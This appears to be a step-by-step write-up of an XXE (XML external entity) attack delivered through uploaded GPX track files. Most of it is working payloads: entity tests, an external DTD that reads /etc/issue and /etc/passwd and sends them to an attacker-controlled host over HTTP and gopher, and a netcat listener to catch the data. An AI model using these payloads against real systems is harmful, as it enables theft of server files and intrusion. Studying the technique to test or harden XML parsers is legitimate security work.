@@ -1,0 +1,115 @@
+GPX EXAMPLE
+
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <time>2014-06-07T20:04:44.453Z</time>
+  <bounds maxlat="35.461644151" maxlon="-73.562228351" minlat="35.437931663" minlon="-73.610299487">
+  <trk>
+    <trkseg>
+      <trkpt lat="35.460997739" lon="-73.568049331">
+        <ele>22.600000</ele>
+        <time>2014-06-07T18:06:16Z</time>
+        <speed>0.000000</speed>
+      </trkpt>
+      <trkpt lat="35.460997655" lon="-73.568049163">
+        <ele>22.600000</ele>
+        <time>2014-06-07T18:06:16Z</time>
+        <speed>0.000000</speed>
+      </trkpt>
+      [...]
+       
+   </trkseg></trk>
+</bounds></gpx>
+
+
+
+TURN TO
+
+Step 1 : Confirmation that entities are interpreted
+
+<!DOCTYPE gpx [<!ENTITY xxe "35.460997739" > ]>
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <time>2014-06-07T20:04:44.453Z</time>
+  <bounds maxlat="35.461644151" maxlon="-73.562228351" minlat="35.437931663" minlon="-73.610299487">
+  <trk>
+    <trkseg>
+      <trkpt lat="&xxe;" lon="-73.568049331">
+        <ele>22.600000</ele>
+        <time>2014-06-07T18:06:16Z</time>
+        <speed>0.000000</speed>
+      </trkpt>
+   </trkseg></trk>
+</bounds></gpx>
+
+
+Step 2 : Confirmation that SYSTEM entities are usable
+
+(We can now try loading external resources from a host we control. 
+The resources can be hosted on a HTTP server, FTP server or even Samba shares in the case of intranet application.)
+
+<!DOCTYPE gpx [<!ENTITY xxe SYSTEM "http://xxe.me/ping_me" > ]>
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <desc>&xxe;</desc>
+  <time>2014-06-07T20:04:44.453Z</time>
+  <bounds maxlat="35.461644151" maxlon="-73.562228351" minlat="35.437931663" minlon="-73.610299487">
+  <trk>
+    <trkseg>
+      <trkpt lat="35.460997739" lon="-73.568049331">
+        <ele>22.600000</ele>
+        <time>2014-06-07T18:06:16Z</time>
+        <speed>0.000000</speed>
+      </trkpt>
+   </trkseg></trk>
+</bounds>
+</gpx>
+
+
+Step 3 : Test for external DTD availability to exfiltrate data
+
+evil.gpx:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gpx [ 
+ <!ENTITY % file SYSTEM "file:///etc/issue">
+ <!ENTITY % dtd SYSTEM "http://xxe.me/evil1.dtd">
+%dtd;]>
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <desc>&send;</desc>
+   [....]
+</gpx>
+
+
+http://xxe.me/evil1.dtd :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://xxe.me/content?%file;'>">
+%all;
+
+
+Step 4 : Test for external DTD with gopher protocol
+
+(We still have an option to fetch arbitrary file. A good observer would have notice that the remote JVM version was capture on step 1. The version is Java 1.6 update 26. The gopher protocol was disable on version 1.6 update 37 [Ref].The gopher protocol can be use to open a TCP connection and send arbitrary data.)
+
+gopher://remote_host:remote_port/?ARBITRARY_DATA
+
+evil2.gpx :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE gpx [ 
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY % dtd SYSTEM "http://xxe.me/evil2.dtd"> 
+%dtd;]>
+<gpx creator="EliteGPS" version="1.0" xmlns="http://www.topografix.com/GPX/1/0">
+  <desc>&send;</desc>
+   [....]
+</gpx>
+
+http://xxe.me/evil2.dtd :
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'gopher://xxe.me:1337/xxe?%file;'>">
+%all;
+
+Then we can open a connection and listen --> nc -nlvk 1337
+
+
+
